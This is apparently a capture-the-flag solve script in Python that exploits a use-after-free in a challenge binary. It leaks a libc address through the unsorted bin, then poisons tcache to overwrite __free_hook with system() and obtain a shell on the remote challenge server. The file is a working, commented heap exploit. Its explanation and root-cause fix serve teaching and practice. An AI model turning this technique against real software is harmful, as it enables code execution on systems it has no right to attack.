#!/usr/bin/env python3
from pwn import *

#
# Exploitation strategy:
#
# This binary exposes a classic Use-After-Free (UAF): free() is called on
# note[i].content but the pointer is never NULLed out, leaving a dangling
# reference that can still be read (show) and written (edit).
#
# ===== Stage 1: libc leak via unsorted bin =====
#
# glibc's tcache only holds chunks up to 0x410 bytes. Larger chunks bypass
# tcache entirely and go straight to the unsorted bin when freed. The unsorted
# bin is a circular doubly-linked list anchored inside main_arena (in libc):
# both the fd and bk of the first (and only) free chunk point back into
# main_arena (which is inside libc) at a fixed offset from libc base.
#
# Steps:
#   1. Allocate a large chunk (>= 0x420, size 0x500 here) as note[0].
#   2. Allocate a small "guard" chunk as note[1] immediately after note[0],
#      to prevent the allocator from merging note[0] with the top chunk
#      when it is freed (top-chunk coalescing would destroy the fd/bk pointers).
#   3. Free note[0] -> it lands in the unsorted bin.
#      note[0].content (dangling) still points to the freed chunk.
#      The first 8 bytes of the chunk are now fd -> &main_arena+96 (libc pointer).
#   4. show(0): write(stdout, note[0].content, 0x10) leaks fd and bk.
#      Parse the first 8 bytes -> unsorted bin address -> libc base.
#
# ===== Stage 2: __free_hook hijack via tcache poisoning =====
#
# glibc 2.31 still has __free_hook: a function pointer called by free()
# before doing anything else. Overwriting it with system() means the next
# free(ptr) becomes system(ptr), so we just need ptr -> "/bin/sh".
#
# Steps:
#   5. Compute target addresses:
#        libc_base      = leaked_ptr  - (main_arena_offset + 96)
#        __free_hook    = libc_base   + libc.sym.__free_hook
#        system         = libc_base   + libc.sym.system
#   6. Allocate two small same-sized chunks (0x40) as note[2] and note[3].
#   7. Free note[2], then note[3] -> tcache freelist: note[3] -> note[2] -> NULL
#   8. UAF-edit note[3]: overwrite its tcache fd with &__free_hook.
#      Freelist: note[3] -> __free_hook -> ???
#      (glibc 2.31 has no safe-linking, so fd is stored in plaintext).
#   9. malloc twice (same size):
#        create(4, ...) -> pops note[3] (harmless data written)
#        create(5, ...) -> pops __free_hook; write p64(system) into it
#      Now __free_hook = system.
#  10. Allocate note[6] with content "/bin/sh\x00".
#  11. free(note[6]) -> free() calls __free_hook(ptr) = system("/bin/sh") -> shell.
#
# Root cause:
#   free(notes[i].content) without setting notes[i].content = NULL leaves a
#   dangling pointer. A one-line fix (notes[i].content = NULL after free) would
#   prevent both the leak and the poisoning primitive.
#

context.binary = elf = ELF('./whisper', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

p = remote("offsec.m0lecon.it", 13517)

def create(index, size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index: ', str(index).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)

def delete(index):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(index).encode())

def edit(index, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(index).encode())
    p.sendafter(b'data: ', data)

def show(index):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'index: ', str(index).encode())
    return p.recvline()   # 0x10 bytes + newline

# ====================================
# Stage 1: libc leak via unsorted bin
# ====================================

# Step 1+2: large chunk + guard chunk
# 0x500 >> 0x410 -> bypasses tcache, goes to unsorted bin on free
create(0, 0x500, b'A' * 0x500)   # victim chunk
create(1, 0x40,  b'A' * 0x40)    # guard: prevents top-chunk coalescing

# Step 3: free the large chunk -> it lands in the unsorted bin. This way, fd/bk points to -> main_arena (which is inside libc)
delete(0)

# Step 4: leak fd (first 8 bytes of freed chunk = unsorted bin pointer into libc)
leak = show(0)
leak_addr = u64(leak[:8].ljust(8, b'\x00'))
log.info(f"unsorted bin leak = {hex(leak_addr)}")

# `main_arena` symbol is NOT exported => derive libc_base from `__malloc_hook` symbol instead.
# glibc 2.31 layout: unsorted bin fd = libc_base + main_arena + 96 (0x60) = libc_base + __malloc_hook + 0x10 + 0x60
# Therefore: libc_base = leak_addr - (main_arena_offset + 96) = leak_addr - (__malloc_hook_offset + 0x10 + 0x60)
malloc_hook_offset = libc.sym.__malloc_hook
libc_base = leak_addr - (malloc_hook_offset + 0x10 + 0x60)  # to find the correct offset we can adjust it until we figure out that by inserting 0x10 + 0x60 we get a valid libc base (ending with 0x000)
log.info(f"libc base = {hex(libc_base)}")

free_hook = libc_base + libc.sym.__free_hook
system = libc_base + libc.sym.system
log.info(f"__free_hook = {hex(free_hook)}")
log.info(f"system = {hex(system)}")

# ==================================================
# Stage 2: tcache poisoning -> __free_hook = system
# ==================================================

# Step 6: two small same-sized chunks -> same tcache bin
SMALL = 0x40
create(2, SMALL, b'A' * SMALL)
create(3, SMALL, b'B' * SMALL)

# Step 7: free both -> the tcache freelist (LIFO) becomes: note[3] -> note[2] -> NULL
delete(2)
delete(3)

# Step 8: UAF-edit note[3] to poison its fd with `&__free_hook`
# glibc 2.31 -> no safe-linking -> fd in plaintext
edit(3, p64(free_hook).ljust(SMALL, b'\x00'))

# Step 9: two mallocs to consume the poisoned freelist
create(4, SMALL, b'A' * SMALL)                       # pops note[3] from the freelist, so the tcache freelist becomes:  __free_hook -> ???
create(5, SMALL, p64(system).ljust(SMALL, b'\x00'))  # pops __free_hook from the freelist and writes `system()` into it

log.info("__free_hook overwritten with system()")

# Step 10: allocate a chunk containing "/bin/sh\x00"
create(6, SMALL, b'/bin/sh\x00' + b'\x00' * (SMALL - 8))

# Step 11: free note[6] -> free() calls __free_hook(note[6]) = system("/bin/sh")
delete(6)

p.sendline(b"printenv FLAG")   # to print the flag after getting the shell

p.interactive()
